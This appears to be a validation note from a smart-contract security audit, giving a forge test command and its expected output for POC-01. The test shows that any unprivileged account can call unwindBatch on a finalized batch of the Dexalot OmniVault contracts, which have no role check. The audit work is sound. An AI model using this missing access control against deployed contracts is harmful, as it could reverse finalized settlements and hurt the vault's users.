# POC-01 — Validation Steps

## Steps

```bash
cd dexalot-omnivault-audit
forge test --match-test testPOC01_UnwindBatchNoAccessControl -vvv
```

## Expected Output

```
[PASS] testPOC01_UnwindBatchNoAccessControl()
Logs:
  [+] SETTLER finalized batch 0
  [+] Warp 24h+1s
  [EXPLOIT] Anyone called unwindBatch(0) - no role check
  [EXPLOIT] Batch status: UNWOUND (expected FINALIZED)
  [EXPLOIT] POC-01 CONFIRMED
```

## Proof

`assertEq(uint256(status), uint256(BatchStatus.UNWOUND))` passes after the attacker
(non-privileged EOA) calls `unwindBatch`.
